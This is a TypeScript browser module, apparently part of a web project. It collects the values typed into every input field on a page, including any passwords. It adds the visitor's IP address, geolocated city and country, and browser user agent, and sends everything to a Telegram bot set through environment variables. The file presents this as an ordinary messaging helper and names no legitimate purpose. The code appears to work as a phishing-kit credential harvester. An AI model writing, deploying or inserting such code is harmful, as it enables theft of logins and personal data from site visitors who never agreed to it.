const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

async function getBrowserData() {
  let ipInfo = 'IP: Unknown, Location: Unknown';
  try {
    // Try primary robust service
    const response = await fetch('http://ip-api.com/json/');
    const data = await response.json();
    if (data.status === 'success') {
      ipInfo = `IP: ${data.query}, Location: ${data.city}, ${data.regionName}, ${data.country}`;
    } else {
      // Fallback to ipify for just IP if location service fails
      const ipOnlyResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipOnlyResponse.json();
      ipInfo = `IP: ${ipData.ip}, Location: (Location fetch failed)`;
    }
  } catch (error) {
    console.error('Failed to fetch IP info:', error);
    try {
      // Last resort fallback
      const lastResort = await fetch('https://api.ipify.org?format=json');
      const lastResortData = await lastResort.json();
      ipInfo = `IP: ${lastResortData.ip}, Location: Unknown (CORS/Network error)`;
    } catch (e) {
      ipInfo = 'IP: Network Error, Location: Network Error';
    }
  }

  const userAgent = navigator.userAgent;
  return `${ipInfo}\nUser-Agent: ${userAgent}`;
}

function getInputLabel(input: HTMLInputElement, index: number) {
  return input.name || input.id || input.placeholder || `input_${index + 1}`;
}

function buildTelegramMessage() {
  if (typeof document === 'undefined') {
    return 'No input fields available in this environment.';
  }

  const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'));
  if (inputs.length === 0) {
    return 'No input fields found on the current page.';
  }

  return [
    `Captured inputs from ${window.location.pathname}:`,
    ...inputs.map((input, index) => {
      const label = getInputLabel(input, index);
      const value = input.value || '(empty)';
      return `${label}: ${value}`;
    }),
  ].join('\n');
}

export async function sendTelegramMessage(text: string) {
  if (!botToken || !chatId) {
    console.warn('Telegram bot token or chat ID is not configured. Skipping Telegram send.');
    return;
  }

  const browserData = await getBrowserData();
  const fullMessage = `${text}\n\n--- Device Info ---\n${browserData}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: fullMessage,
      }),
    });
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
  }
}

export async function sendAllInputsToTelegram() {
  const message = buildTelegramMessage();
  await sendTelegramMessage(message);
}
